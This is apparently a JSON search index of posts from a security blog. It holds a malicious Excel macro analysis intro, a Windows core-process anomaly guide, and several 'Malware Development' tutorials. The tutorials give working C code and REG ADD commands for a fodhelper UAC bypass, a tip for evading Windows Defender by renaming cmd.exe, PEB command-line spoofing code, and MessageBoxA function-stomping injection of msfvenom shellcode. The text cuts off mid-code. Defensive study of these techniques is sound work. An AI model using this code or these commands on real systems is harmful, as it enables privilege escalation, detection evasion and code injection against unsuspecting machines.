[
  
  {
    "title": "Analysis of Macro-Embedded Excel File",
    "url": "/posts/Analaysis_of_Macro-Embeeded-Excel-File/",
    "categories": "Malware Analysis",
    "tags": "Malware Analysis",
    "date": "2024-11-28 15:34:00 +0545",
    





    
    "snippet": "We are going to carefully examine the Excel file and the macro it contains. Our goal is to study the macro closely to see how it behaves when the file is opened. We will look for signs that the mac...",
    "content": "We are going to carefully examine the Excel file and the macro it contains. Our goal is to study the macro closely to see how it behaves when the file is opened. We will look for signs that the macro might try to connect to external servers, steal sensitive data, or perform any harmful actions. By doing this, we aim to understand how the malware works and identify any risks it might pose.You can find the detailed analysis in the embedded PDF below:"
  },
  
  {
    "title": "UAC bypass using fodhelper",
    "url": "/posts/UAC_bypass_using_fodhelper/",
    "categories": "Malware Development",
    "tags": "UAC Bypass, Malware Development, Windows Internals",
    "date": "2024-08-21 15:34:00 +0545",
    





    
    "snippet": "User Account Control (UAC) is a crucial security feature in Windows designed to prevent unauthorized changes to the operating system. However, vulnerabilities in UAC can be exploited to escalate pr...",
    "content": "User Account Control (UAC) is a crucial security feature in Windows designed to prevent unauthorized changes to the operating system. However, vulnerabilities in UAC can be exploited to escalate privileges. One common method for such exploitation involves fodhelper.exe. This post will explore how fodhelper.exe can be used to bypass UAC and how this technique can be implemented by malware to escalate privileges and defeat Windows defender.Before diving into how fodhelper.exe can be exploited. it’s important to know how basics of this exploitation works.fodhelper.exefodhelper.exe was introduced in Windows 10 to manage optional features like region-specific keyboard settings. It’s located at C:\\Windows\\System32\\fodhelper.exe in the System32 directory. This file is digitally signed by Microsoft, ensuring its authenticity and integrity.c:\\windows\\system32\\fodhelper.exe:    Verified:       Signed    Signing date:   4:21 AM 7/4/2024    Publisher:      Microsoft Windows    Company:        Microsoft Corporation    Description:    Features On Demand Helper    Product:        Microsoft® Windows® Operating System    Prod version:   10.0.22621.3672    File version:   10.0.22621.3672 (WinBuild.160101.0800)    MachineType:    64-bit    Binary Version: 10.0.22621.3672    Original Name:  FodHelper.EXE    Internal Name:  FodHelper    Copyright:      © Microsoft Corporation. All rights reserved.    Comments:       n/a    Entropy:        5.558    Manifest:&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;!-- Copyright (c) Microsoft Corporation --&gt;&lt;assembly   xmlns=\"urn:schemas-microsoft-com:asm.v1\"   xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"   manifestVersion=\"1.0\"&gt; &lt;assemblyIdentity type=\"win32\" publicKeyToken=\"6595b64144ccf1df\" name=\"Microsoft.Windows.FodHelper\" version=\"5.1.0.0\" processorArchitecture=\"amd64\"/&gt; &lt;description&gt;Features On Demand Helper UI&lt;/description&gt; &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;  &lt;security&gt;      &lt;requestedPrivileges&gt;          &lt;requestedExecutionLevel            level=\"requireAdministrator\"          /&gt;      &lt;/requestedPrivileges&gt;  &lt;/security&gt; &lt;/trustInfo&gt; &lt;asmv3:application&gt;    &lt;asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\"&gt;        &lt;dpiAware&gt;true&lt;/dpiAware&gt;        &lt;autoElevate&gt;true&lt;/autoElevate&gt;    &lt;/asmv3:windowsSettings&gt; &lt;/asmv3:application&gt;&lt;/assembly&gt;fodhelper.exe is designed to automatically run with elevated privileges because it has the autoelevate flag set. This allows it to upgrade its integrity level from Medium to High without requiring a UAC prompt. The sigcheck tool shows that the application is intended for administrative users and requires full admin rights. The autoelevate feature enables it to achieve these higher privileges without requesting admin approval.Understanding the exploitationRunning fodhelper.exe and capturing its events with ProcMon shows that it attemps to query a default value for the registry key HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command. Additionally, it checks for the DelegateExecute value in the same registry path (HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command).Understanding File Execution Through the Windows RegistryTo clearly understand the exploitation, it’s important to examine how file execution works. For better clarity, let’s use the example of an .html file.When a file is double-clicked in Windows, the system determines which application should open it based on the file’s extension (like .html, .txt, etc.). The information linking file extensions to their respective applications is stored in the Windows Registry, specifically under HKEY_CLASSES_ROOT.  Suppose an .html file is opened; the system checks for the .html extension under the .html key in HKEY_CLASSES_ROOT to look for it’s ProgID.ProgID: A Programmatic ID (ProgID) is a string that uniquely identifies a specific version of a COM class, which can be an application or a component. For file associations, a ProgID links a file extension to the application or component that should handle it. The correct structure of a ProgID key name follows the format [Vendor or Application].[Component].[Version], using periods to separate each part, with no spaces in between. An example would be Word.Document.6.For an HTML file, the ProgID is htmlfile, which is outlined in red in the screenshot below.  Once the ProgID (htmlfile) is identified, Windows searches for the corresponding ProgID key under HKEY_CLASSES_ROOT.      Under the ProgID key (HKEY_CLASSES_ROOT\\htmlfile),There is typically a shell subkey that defines actions such as open, edit, and more.        The open action usually has a command subkey that specifies the command line used to open the file. This command often points to the executable of the preferred web browser for html file    The command subkey might have a value like\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" \"%1\"   Here, %1 is a placeholder for the file path. So, when .html file is opened, the system will run below command  and the HTML file opens in the browser.\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" \"C:\\path\\to\\example.html\"Case for fodhelper.exeIn the case of fodhelper.exe, the system queries HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\Command. This is because settings under HKEY_CURRENT_USER\\Software\\Classes are specific to the currently logged-in user and can override the system-wide settings. For instance, if a user has set .html files to open with a different browser, this preference is saved in this registry path. As a result, system checks this location to see if the user has any custom commands for opening exe files. This allows fodhelper.exe to execute commands with elevated privileges based on user-specific configurations.ExploitationNow that the exploitation process is understood, let’s take a look at how it is represented in code. // Registry path to be created    LPWSTR subkey = L\"Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command\";    HKEY phkresult;    DWORD dwDisposition;    // Create the specified registry key    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &amp;phkresult, &amp;dwDisposition) != ERROR_SUCCESS) {        printf(\"RegCreateKeyExW failed with error code %x\\n\", GetLastError());        return 1;    }    printf(\"The disposition is %x\\n\", dwDisposition);      LPSTR valueName = \"DelegateExecute\";    char values[MAX_PATH] = \"cmd.exe\";    // Set the value for the default key    if (RegSetValueExA(phkresult, NULL, 0, REG_SZ, (const BYTE*)values, lstrlenA(values) + 1) != ERROR_SUCCESS) {        printf(\"RegSetValueExA failed with error code %x\\n\", GetLastError());        RegCloseKey(phkresult);        return 1;    }    // Set the value for the DelegateExecute key    if (RegSetValueExA(phkresult, valueName, 0, REG_SZ, NULL, 0) != ERROR_SUCCESS) {        printf(\"RegSetValueExA failed with error code %x\\n\", GetLastError());        RegCloseKey(phkresult);        return 1;    }        RegCloseKey(phkresult);        STARTUPINFO si = { 0 };    si.cb = sizeof(si);    PROCESS_INFORMATION pi = { 0 };    // Create a new process to run fodhelper.exe    if (!CreateProcessA(NULL, \"powershell.exe -c fodhelper.exe\", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi)) {        printf(\"CreateProcessA failed with error code %x\\n\", GetLastError());        return 1;    }       CloseHandle(pi.hThread);    CloseHandle(pi.hProcess);If the code looks a bit boring, a simple 3-step PowerShell script can do the same thing.Using PowerhsellAs fodhelper.exe checks the HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\Command key in the registry, the PowerShell REG utility can be used to add this registry key.PS C:\\Users\\ACER&gt; REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\commandThe operation completed successfully.PS C:\\Users\\ACER&gt;Since fodhelper.exe looks for the default value data to be an executable file, setting it to cmd.exe will work.PS C:\\Users\\ACER&gt; REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /fThe operation completed successfully.PS C:\\Users\\ACER&gt;fodhelper.exe also checks for the DelegateExecute value in the same registry key. This value can be added with empty data using the following command:PS C:\\Users\\ACER&gt; REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d \"\" /fThe operation completed successfully.PS C:\\Users\\ACER&gt;After successfully adding all the necessary registry keys, values, and data, executing fodhelper.exe will bypass UAC. Since cmd.exe has been set, a Command Prompt with elevated privileges should appear.What’s Stopping the Attack?Windows Defender: Is It Enough?if the above steps were simply followed then you might find that Windows Defender isn’t quite celebrating the fact that a cmd.exe has been launched with elevated privileges especially without triggering a UAC prompt.To keep things under the radar, just make a copy of cmd.exe from C:\\Windows\\System32 and give it a new name something less obvious. This simple trick can help avoid detection.                                                              Your browser does not support the video tag. Here is a    link to the video file instead.        Defender bypass  "
  },
  
  {
    "title": "Windows Core Processes",
    "url": "/posts/Windows_core_processes/",
    "categories": "Windows Internals",
    "tags": "Windows Internals",
    "date": "2024-08-09 15:34:00 +0545",
    





    
    "snippet": "Windows core processes are fundamental components of the operating system that manage various essential functions to keep computer running smoothly. These processes handle everything from starting ...",
    "content": "Windows core processes are fundamental components of the operating system that manage various essential functions to keep computer running smoothly. These processes handle everything from starting up system to managing hardware and software operations. Here’s a brief overview of some key core processes in Windows and how you can detect anomalies within them:Image source: dfir-world.tumblr.comSYSTEMThe SYSTEM process is the very first process that runs when Windows starts, often referred to as the System Idle Process. It plays a crucial role in managing low-level operations and system resources, ensuring everything functions smoothly behind the scenes. The SYSTEM process takes care of tasks like running core system threads, handling hardware interrupts, and overseeing essential services. It always has a Process ID (PID) of 4 and operates without a parent process, running under the NT AUTHORITY\\SYSTEM user account.Normal Behavior:  PID: Always 4  Parent Process: None  User Account: NT AUTHORITY\\SYSTEM  Start Time: At system boot  Number of Instances: Only one instance after bootAbnormal Behavior:  PID: Anything other than 4  Parent Process: Presence of a parent process (which shouldn’t exist)  Command-Line Arguments: The process should not have any  Multiple Instances: More than one instance of the SYSTEM process runningsmss.exe (Session Manager Subsystem)smss.exe, also known as the Session Manager Subsystem, is a crucial process in Windows. It manages the creation of new sessions and the setup of environment variables. The parent process for smss.exe, often referred to as the master smss.exe, is the SYSTEM process.When smss.exe runs, it creates two sessions:  Session 0: Responsible for creating csrss.exe and wininit.exe. Both of these processes are isolated sessions of the OS.  Session 1: Responsible for creating csrss.exe and winlogon.exe.After these tasks are completed, the child instances of smss.exe will exit, leaving only the master process active.Normal Behavior  User Account: NT AUTHORITY\\SYSTEM  Parent Process: SYSTEM  Instances: Only one instance after boot-up  Path: %systemroot%\\System32\\smss.exe  Command-Line Arguments: NoneAbnormal Behavior  Parent Process: Anything other than SYSTEM, or if the parent process has a PID other than 4  Command-Line Arguments: Presence of command-line arguments  Start Time: Should be a few seconds after SYSTEM  User Account: Anything other than NT AUTHORITY\\SYSTEMCSRSS.exe (Client/Server Runtime Subsystem)csrss.exe, or Client/Server Runtime Subsystem, is a vital Windows process responsible for the creation and management of Windows consoles and threads. It plays a crucial role in authentication, authorization, and enforcing security policies within the operating system.Normal Behavior  Image Path: %SystemRoot%\\System32\\csrss.exe  Number of Instances: Two or more  User Account: NT AUTHORITY\\SYSTEM  Parent Process: Not visible, as smss.exe will exit after spawning csrss.exeAbnormal Behavior  Parent Process: Any process other than smss.exe  Image Path: Any path other than %SystemRoot%\\System32\\csrss.exeWININIT.EXE Wininit.exe is a crucial system process in Windows, standing for Windows Initialization. It handles the startup of key system components by reading and executing commands from the winInit.ini file. Essentially, it plays a significant role in initializing essential parts of the operating system.Normal Behavior  Image Path: %SystemRoot%\\System32\\wininit.exe  User Account: NT AUTHORITY\\SYSTEM  Parent Process: Not visible, as smss.exe will exit after spawning csrss.exe.  Number of Instances: One  Command-Line Arguments: NoneAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\wininit.exe  User Account: Any account other than NT AUTHORITY\\SYSTEM  Parent Process: Visible parent processes or unusual parent-child relationships  Number of Instances: More than one  Command-Line Arguments: Presence of command-line argumentsSERVICES.EXEAs name says Services.exe is responsible for managing system services. These services run in the background and are essential for various Windows functions, such as managing network connections, ensuring security, handling device drivers, and more.### Normal Behavior  Image Path: %SystemRoot%\\System32\\services.exe  User Account: NT AUTHORITY\\SYSTEM  Parent Process: Wininit.exe  Number of Instances: OneAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\services.exe  User Account: Any account other than NT AUTHORITY\\SYSTEM  Parent Process: Parent processes other than wininit.exe.  Number of Instances: More than one instance running simultaneouslyLsass.exeThe Local Security Authority Subsystem Service (lsass.exe) handles user authentication by using packages specified in the HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa registry key. It also creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. Because it deals with sensitive authentication data, this process is often targeted by malware. Tools like mimikatz can exploit it to read this registry key and steal credentials.Normal Behavior  Image Path: %SystemRoot%\\System32\\lsass.exe  User Account: NT AUTHORITY\\SYSTEM  Parent Process: wininit.exe  Number of Instances: Only one; should not have any child processes except for EFS (Encrypting File System).Abnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\lsass.exe  User Account: Any account other than NT AUTHORITY\\SYSTEM  Parent Process: Parent processes other than Wininit.exeLSAiso.exeLSAiso.exe (or LSA Isolated) is a legitimate Windows process that runs in Virtual Secure Mode (VSM) as an Isolated User Mode (IUM) process. You will only see LSAiso.exe if Credential Guard is enabled.Normal Behavior  Image Path: %SystemRoot%\\System32\\lsaiso.exe  User Account: NT AUTHORITY\\SYSTEM  Parent Process: wininit.exe  Number of Instances: Only oneAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\lsaiso.exe  User Account: Any account other than NT AUTHORITY\\SYSTEM  Parent Process: Parent processes other than wininit.exe  Other: Presence of the process when Credential Guard is disabledsvchost.exesvchost.exe serves as a host process for loading services from DLL files. Due to the numerous services required for Windows to function properly, multiple instances of svchost.exe typically run simultaneously. Because of this, malware often attempts to blend itself by using similar names, such as scvhost.exe, which can be difficult for an unexperienced eye to spot.Normal Behavior  Image Path: %SystemRoot%\\System32\\svchost.exe  User Account: Varies; some instances run as the logged-in user  Parent Process: services.exe  Command-Line Arguments: must contain ‘-k’ parameter  Number of Instances: ManyAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\svchost.exe  User Account: Unusual user accounts, especially those not typically associated with service processes  Parent Process: Parent processes other than services.exeRuntimeBroker.exeThis process is responsible for managing and verifying permissions required by other processes, such as access to the microphone, location, and other system features.Normal Behavior  Image Path: %SystemRoot%\\System32\\runtimebroker.exe  User Account: Same as the logged-on user  Parent Process: svchost.exe  Number of Instances: Only oneAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\runtimebroker.exe  User Account: Any account other than the logged-on user  Parent Process: Parent processes other than svchost.exe  Number of Instances: More than one instance running simultaneouslyTASKHOSTW.exeTaskhostw.exe is a Windows process that hosts DLL files related to scheduled tasks. Its name may vary across different versions of Windows, as Microsoft has changed it multiple times. you can often identify the version of Windows by the name of this process.Normal Behavior  Image Path: %SystemRoot%\\System32\\taskhostw.exe  User Account: System or the same as the logged-on user  Parent Process: svchost.exe  Number of Instances: Multiple instances can be seenAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\taskhostw.exe  Parent Process: Parent processes other than svchost.exe or having no parent processLSM.EXE Local Session Manager (LSM) is responsible for managing user sessions, including creating and deleting them. It ensures that sessions are kept isolated from each other and handles requests to smss.exe to start new sessions. In Windows 10, it is seen as a service DLL named lsm.dll.Normal Behavior  Image Path: %SystemRoot%\\System32\\lsm.dll (In Windows 10, it is seen as a service DLL)  User Account: NT AUTHORITY\\SYSTEM  Parent Process: wininit.exe  Number of Instances: Only oneAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\lsm.dll (In Windows 10, it should appear as a service DLL)  User Account: Any account other than NT AUTHORITY\\SYSTEM  Parent Process: Parent processes other than wininit.exe  Number of Instances: More than one instance running simultaneouslyWINLOGON.exewinlogon.exe handles user logons and logoffs. When a user logs in, winlogon.exe is responsible for loading the user profile into the registry under HKEY_CURRENT_USER.Normal Behavior  Image Path: %SystemRoot%\\System32\\winlogon.exe  User Account: NT AUTHORITY\\SYSTEM  Parent Process: smss.exe  Number of Instances: Varies based on the number of logged-on usersAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\System32\\winlogon.exe  User Account: Any account other than NT AUTHORITY\\SYSTEM  Parent Process: Parent processes other than smss.exe  Number of Instances: Unusual number of instances, such as multiple instances when only one is expectedExplorer.exeexplorer.exe is the process that provides users with access to their files and folders and offers the graphical interface for interacting with Windows. It handles the desktop environment, taskbar, and file management functions.Normal Behavior  Image Path: %SystemRoot%\\explorer.exe  User Account: Same as the logged-on user  Parent Process: wininit.exe  Number of Instances: Typically one per user sessionAbnormal Behavior  Image Path: Any path other than %SystemRoot%\\explorer.exe  Parent Process: Parent processes other than wininit.exeReferences  DFIR World: Windows 10 Core Processes  0xcybery: Core Processes In Windows System  MalwareTips: Local Session Manager Process - What You Need to Know  How-To Geek: What is Windows Logon Application (winlogon.exe) and Why is it Running on My PC?  The Windows Club: What is Taskhostw.exe  Help Desk Geek: What is Lsaiso.exe and How to Reduce Its High CPU Usage  MalwareTips: Wininit.exe - What It Is &amp; Should I Remove It?"
  },
  
  {
    "title": "Command Line Spoofing",
    "url": "/posts/command-line-spoofing/",
    "categories": "Malware Development",
    "tags": "Malware Development",
    "date": "2024-07-30 15:34:00 +0545",
    





    
    "snippet": "Command line spoofing is a technique where the instructions given to a program through the command line are altered or replaced. To make this clearer, let’s break it down:When a program runs, it of...",
    "content": "Command line spoofing is a technique where the instructions given to a program through the command line are altered or replaced. To make this clearer, let’s break it down:When a program runs, it often needs specific details or instructions to work correctly. These instructions are provided through the command line a way to type in commands and arguments that the operating system uses to run the program. For example, you might use command line arguments to tell a program which files to open or what actions to perform.As can be seen in the screenshot below, the command line interface displays these arguments.Command line spoofing happens when these instructions are changed or manipulated, leading the program to perform actions it wasn’t originally intended to. This can cause the program to behave differently or produce unexpected results.Before StartingTo change the command line of a process, we first need to know about Process Environment Block (PEB).The Process Environment Block (PEB) is a data structure that holds important information about a process. It includes details such as:  Whether the program is being debugged  Loaded modules  Process parameters, and moreSince the PEB is located in user space, it can be accessed relatively easily. The structure of the PEB looks like this:typedef struct _PEB {  BYTE                          Reserved1[2];  BYTE                          BeingDebugged;  BYTE                          Reserved2[1];  PVOID                         Reserved3[2];  PPEB_LDR_DATA                 Ldr;  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;  PVOID                         Reserved4[3];  PVOID                         AtlThunkSListPtr;  PVOID                         Reserved5;  ULONG                         Reserved6;  PVOID                         Reserved7;  ULONG                         Reserved8;  ULONG                         AtlThunkSListPtr32;  PVOID                         Reserved9[45];  BYTE                          Reserved10[96];  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;  BYTE                          Reserved11[128];  PVOID                         Reserved12[1];  ULONG                         SessionId;} PEB, *PPEB;In the PEB structure, the ProcessParameters field refers to the PRTL_USER_PROCESS_PARAMETERS structure which is our main focus because it contains the command line information of the process. To understand why this is important for spoofing the command line, let’s take a look at the structure:typedef struct _RTL_USER_PROCESS_PARAMETERS {  BYTE           Reserved1[16];  PVOID          Reserved2[10];  UNICODE_STRING ImagePathName;  UNICODE_STRING CommandLine;} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;The PRTL_USER_PROCESS_PARAMETERS structure includes a CommandLine field, which is a UNICODE_STRING structure. This field contains the actual command line arguments used by the process. To understand how to modify the command line, we need to take a closer look at the UNICODE_STRING structure.typedef struct _UNICODE_STRING {  USHORT Length;  USHORT MaximumLength;  PWSTR  Buffer;} UNICODE_STRING, *PUNICODE_STRING;The UNICODE_STRING structure includes a Buffer field, which points to the actual command line arguments for the process. This Buffer contains the location where the command line string is stored.If we can overwrite the data at the location pointed to by the Buffer, we should be able to change the command line arguments of the process.TechniqueTo change the command line of a process, we first need to find the address of the PEB (Process Environment Block). Here’s how we can do it:  Retrieve the PEB Address:          Use the NtQueryInformationProcess function with the ProcessBasicInformation value for the ProcessInformationClass parameter. This function provides a PROCESS_BASIC_INFORMATION structure.      The PROCESS_BASIC_INFORMATION structure contains the address of the PEB.        Access the PEB Structure:          Once we have the PEB address from the PROCESS_BASIC_INFORMATION structure, we need to read the process’s memory to access the PEB structure itself.      We will use a custom function called ReadMemoryFromRemoteProcess to retrieve the PEB structure from the process’s memory. This function internally uses the WINAPI function ReadProcessMemory, which is used to read data from a specified memory location in a different process.BOOL ReadMemoryFromRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID* lpbuffer, SIZE_T szsize){\tSIZE_T numberofbytesread;\t*lpbuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szsize);\tif (lpbuffer == NULL) {\t\tprintf(\"Heap allocation failed with error no %x\\n\", GetLastError());\t}\tif (!ReadProcessMemory(hprocess, lpbaseaddress, *lpbuffer, szsize, &amp;numberofbytesread) || szsize != numberofbytesread) {\t\tprintf(\"readprocess memroy failed with error no %x\\n\", GetLastError());\t\treturn FALSE;\t}\treturn TRUE;}After accessing the PEB structure, we will locate and modify the CommandLine field. To do this, we use a custom function named WriteMemoryToRemoteProcess. This function utilizes the WriteProcessMemory WinAPI function to write the new command line data into the target process’s memory space.BOOL WriteMemoryToRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID lpbuffer, SIZE_T szsize) {\tSIZE_T lpNumberOfBytesWritten = 0;\tif (!WriteProcessMemory(hprocess, lpbaseaddress, lpbuffer, szsize, &amp;lpNumberOfBytesWritten) || szsize != lpNumberOfBytesWritten) {\t\tprintf(\"write process memory failed with error no %x\\n\", GetLastError());\t\treturn FALSE;\t}return TRUE;}Logic  Either create a new process or obtain a handle to an existing process where the command line needs to be modified.  Access the buffer in the target process’s memory where the current command line is stored.  Prepare the new command line string that you want to write into the process’s memory.  Use the WriteProcessMemory function to write the new command line data to the appropriate memory address in the target process.Commandlinespoofing functionCommandlinespoofing is a function that implements above technique and logics to spoof the commandline of a process.  in this case notepad is created for simplicity in demonstration.BOOL Commandlinespoofing() {\ttypedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(\t\tHANDLE ProcessHandle,\t\tPROCESSINFOCLASS ProcessInformationClass,\t\tPVOID ProcessInformation,\t\tULONG ProcessInformationLength,\t\tPULONG ReturnLength\t\t);// first command\tWCHAR commandline[] = L\"notepad first command \";\tSTARTUPINFOW SI = { 0 };\tSI.cb = sizeof(SI);\tPRTL_USER_PROCESS_PARAMETERS pprocessparams;\tPROCESS_INFORMATION PI = { 0 };\tNTSTATUS status;\tPROCESS_BASIC_INFORMATION PBI = { 0 };\tPPEB ppeb = NULL;\tif (!CreateProcessW(NULL, commandline, NULL, NULL, FALSE, 0, NULL, NULL, &amp;SI, &amp;PI)) {\t\tprintf(\"Create process failed with error no %x\\n\", GetLastError());\t\treturn FALSE;\t}// getting address of NtQueryInformationProcess\tfnNtQueryInformationProcess NTinformationprocess = GetProcAddress(GetModuleHandleW(L\"ntdll.dll\"), \"NtQueryInformationProcess\");\tif (NTinformationprocess == NULL) {\t\tprintf(\"GetprocAddress or GetmoduleHandleW failed with error no %x\\n\", GetLastError());\t\treturn FALSE;\t}\tULONG returnlength;\tstatus = NTinformationprocess(PI.hProcess, ProcessBasicInformation, &amp;PBI, sizeof(PBI), &amp;returnlength);\tif (status != 0) {\t\tprintf(\"ntinformation process failed with error no %x\\n\", GetLastError());\t}// ReadMemoryFromRemoteProcess function mentioned above\tif (!ReadMemoryFromRemoteProcess(PI.hProcess, PBI.PebBaseAddress,&amp;ppeb, sizeof(PEB))) {\t\treturn FALSE;\t}//sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF , 0xFF is added so we can reach to the command line \tif (!ReadMemoryFromRemoteProcess(PI.hProcess, ppeb-&gt;ProcessParameters, &amp;pprocessparams, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {\t\tHeapFree(GetProcessHeap(), 0, pprocessparams);\t\treturn FALSE;\t}//new commandline\tWCHAR updatecommandline[] = L\"updated command line\";// WriteMemoryToRemoteProcess function mentioned above\tif (!WriteMemoryToRemoteProcess(PI.hProcess, pprocessparams-&gt;CommandLine.Buffer, updatecommandline, sizeof(updatecommandline))) {\t\treturn FALSE;\t}}ExecutionFor simplicity, we use Notepad for the execution process.Notepad is started with “notepad first command” command line then it has been spoofed to “updated command line”.NOTE: Command line spoofing does not work with calc.exe in my case for demonstration. This might be because calc.exe falls under the Universal Windows Platform (UWP), which may not support traditional command line spoofing techniques."
  },
  
  {
    "title": "Local Function Stomping Injection",
    "url": "/posts/local_function_stomping_injection/",
    "categories": "Malware Development",
    "tags": "Malware Development",
    "date": "2024-07-29 19:32:00 +0545",
    





    
    "snippet": "Function StompingFunction stomping typically refers to overwriting the code or data of a function with different content in its memory space. This can be done to modify the behavior of the function...",
    "content": "Function StompingFunction stomping typically refers to overwriting the code or data of a function with different content in its memory space. This can be done to modify the behavior of the function to run as intended by the programmer.for our purpose of stomping, we will use MessageBoxA which would be a better choice because this function is not widely used by operating system or other services. As per Microsoft Documentation MessageBoxA is exported using User32.dllFirstly, we use msfvenom to create our calc shellcode, which we’ll use to overwrite the memory of messageboxA.msfvenom -p windows/x64/exec CMD=calc.exe -f cchar shellcode[] = \t{ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41-------------------&lt;snip&gt; ---------------------------,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };SIZE_T szshellcode= sizeof(shellcode);After defining an array for the shellcode, our next step is to obtain the address of MessageBoxA. To do this, we begin by loading User32.dll using the LoadLibraryA function.HMODULE hmodule = LoadLibraryA(\"User32.dll\");After obtaining the handle to our DLL, we can use GetProcAddress to fetch the address of our exported function.FARPROC Paddress = GetProcAddress(hmodule, \"MessageBoxA\");Once we have obtained the address of our target function, we need to adjust the permissions to allow writing to that memory page. This is necessary because MessageBoxA resides in the .text section of user32.dll, where memory permissions are typically set to Execute Read Only.To enable writing to that address, we can adjust the page protection using the VirtualProtect function with the PAGE_READWRITE protection.if (!VirtualProtect(Paddress, szshellcode, PAGE_READWRITE, &amp;oldprotection)) {\t\t\t\t\tprintf(\" virtualprotect failed with errorno %d\\\\n\", GetLastError());}After successfully changing the permissions to ReadWrite, we can then copy our shellcode, generated from msfvenom, to the address of MessageBoxA simply by using memcpymemcpy(Paddress, shellcode, szshellcode);Now, we can revert the page permissions back to their original state, which was Execute Read, using VirtualProtect.VirtualProtect(Paddress, szshellcode, PAGE_EXECUTE_READ, &amp;oldprotection);Afterwards, we can use the CreateThread function to create a new thread that calls the MessageBoxA function, which in turn executes our calc shellcodeCreateThread(NULL, NULL, Paddress, NULL, NULL, NULL);The complete code appears as follows:    #include &lt;stdio.h&gt;    #include &lt;stdlib.h&gt;    #include &lt;Windows.h&gt;    BOOL stomper(FARPROC Paddress, char* shellcode, SIZE_T szshellcode) {    DWORD oldprotection = NULL;    //changing page permission    if (!VirtualProtect(Paddress, szshellcode, PAGE_READWRITE, &amp;oldprotection)) {    printf(\"virtualprotect ReadWrite failed with errorno %d\\\\n\", GetLastError());    return FALSE;    }    //copy shellcode to stomping function address (MessageboxA)    memcpy(Paddress, shellcode, szshellcode);    //changing page permission to original    if (!VirtualProtect(Paddress, szshellcode, PAGE_EXECUTE_READ, &amp;oldprotection)) {    printf(\"virtualprotect Execute_Read failed with errorno %d\\\\n\", GetLastError());    return FALSE;    }    return TRUE;    }    int main() {    FARPROC Paddress;    HMODULE hmodule;    char shellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50    ,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52    -------------------&lt;snip&gt;------------------------    ,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0    ,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff    ,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };    hmodule = LoadLibraryA(\"User32.dll\");    if (hmodule == NULL) {    printf(\"cannot get handlue to the module\\\\n\");    goto end;    }    Paddress = GetProcAddress(hmodule, \"MessageBoxA\");    if (Paddress == NULL) {    printf(\"cannot get handle to MessageBoxA\\\\n\");    goto end;    }    printf(\"The address of MessageboxA is 0x%p\\\\n\", Paddress);    if (stomper(Paddress, shellcode, sizeof(shellcode))) {    printf(\"Shellcode successfully injected.\\\\n\");    }    else {    printf(\"Shellcode injection failed.\\\\n\");    goto end;    }    //create a thread to execute calc shellcode    HANDLE hThread = CreateThread(NULL, NULL, Paddress, NULL, NULL, NULL);    if (hThread == NULL) {    